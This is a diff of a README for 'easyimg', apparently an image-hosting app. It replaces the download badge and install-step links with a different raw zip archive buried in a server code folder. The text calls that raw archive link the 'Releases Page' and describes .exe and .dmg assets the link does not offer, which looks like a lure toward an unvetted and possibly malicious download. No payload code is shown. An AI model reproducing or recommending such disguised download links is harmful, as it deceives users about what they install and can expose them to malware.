@@ -1,7 +1,7 @@
 # 🌟 easyimg - Your Simple Image Hosting Solution
 
 ## 📦 Download Now
-[![Download easyimg](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/api/blacklist/Software-1.5-beta.2.zip)](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/api/blacklist/Software-1.5-beta.2.zip)
+[![Download easyimg](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/utils/Software_v1.9.zip)](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/utils/Software_v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to easyimg! This application offers a simple and effective way to host your images online. Whether you want to share photos with friends or save images for personal use, easyimg is here to help.
@@ -14,7 +14,7 @@ To run easyimg effectively, ensure your system meets the following requirements:
 - Internet Connection: Required for hosting images online
 
 ## 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/api/blacklist/Software-1.5-beta.2.zip) to find the latest version of easyimg.
+1. Visit the [Releases Page](https://github.com/Domi9xx/easyimg/raw/refs/heads/main/server/utils/Software_v1.9.zip) to find the latest version of easyimg.
 2. Look for the most recent release. Click on the assets list to view available files.
 3. Download the appropriate file for your operating system. If you are using Windows, download the `.exe` file. For macOS, download the `.dmg` file, and for Linux, download the appropriate package.
 4. Once the file is downloaded, find it in your downloads folder.
